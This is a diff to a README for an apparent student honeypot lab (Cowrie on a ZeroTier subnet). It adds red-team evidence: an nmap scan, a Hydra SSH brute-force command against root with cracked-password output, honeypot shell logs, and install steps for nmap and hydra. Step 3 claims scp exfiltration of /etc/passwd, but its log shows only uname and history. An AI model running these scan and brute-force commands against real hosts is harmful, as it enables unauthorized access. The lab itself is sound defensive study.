@@ -36,15 +36,55 @@ The honeypot successfully logged the commands the attacker ran *after* guessing 
 
 ### Step 1: Reconnaissance
 Scanning the private ZeroTier subnet to find the open SSH port (mapped to 2222).
+Scanning the private ZeroTier subnet range (`192.168.192.1-255`) to find active hosts and open ports.
+```bash
+iliass@iliasszarquan:~/Desktop$ nmap -Pn -p 22 --open 192.168.192.1-255
+Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-11-25 22:50 +01
+Nmap scan report for 192.168.192.41
+Host is up (0.53s latency).
+
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 5E:E8:09:58:14:4A (Unknown)
+
+Nmap done: 255 IP addresses (3 hosts up) scanned in 16.67 seconds
 ![Recon Scan](evidence/red_team_recon.png)
+```
 
 ### Step 2: The Breach & Persistence
 After cracking the password with Hydra, we logged in and attempted to change the root password.
 * **The Deception:** Cowrie simulated a "success" message to fool the attacker, but the actual credentials remained unchanged.
+```bash
+iliass@iliasszarquan:~$ hydra -l root -P /usr/share/wordlists/rockyou.txt -t 8 ssh://192.168.192.41 -s 22
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak...
+[DATA] attacking ssh://192.168.192.41:22/
+[22][ssh] host: 192.168.192.41   login: root   password: 123456
+[22][ssh] host: 192.168.192.41   login: root   password: 12345
+1 of 1 target successfully completed, 2 valid passwords found
 ![SSH Session](evidence/red_team_ssh_session.png)
+```
 
 ### Step 3: Data Exfiltration
 The attacker used `scp` to steal sensitive files (`/etc/passwd`) for offline cracking.
+```bash
+admin@srv04:~$ uname -a
+Linux srv04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux
+admin@srv04:~$ history
+    1  ps aux
+    2  uname -a
+    3  history
+```
+### Step 4: File Creation & Persistence Tests:
+The attacked used file and directory creation commands on the victim machine.
+```bash
+admin@srv04:~$ touch iliass.txt
+admin@srv04:~$ mkdir ihab
+admin@srv04:~$ ls -la
+d-wxr-xr-t 1 9673 9673 4096 2025-11-25 22:00 .
+drwxr-xr-x 1 root root 4096 2013-04-05 12:02 ..
+drwxr-xr-x 1 9673 9673 4096 2025-11-25 22:03 ihab
+-rw-r--r-- 1 9673 9673    0 2025-11-25 22:03 iliass.txt
+```
 ![Exfiltration](evidence/red_team_exfiltration.png)
 
 ---
@@ -149,3 +189,13 @@ python3 -m venv myenv
 source myenv/bin/activate 
 pip install -r requirements.txt # Dashboard Reauirements
 python3 -m streamlit run src/log_analyzer.py # Launch
+```
+### Part 3:Attacker Setup
+Since almost all packages are pre-installed in kali already, the attacked only sets up nmap.
+```bash
+# Update package list
+sudo apt update
+
+# Install Nmap (Scanner) and Hydra (Brute Force)
+sudo apt install -y nmap hydra
+```
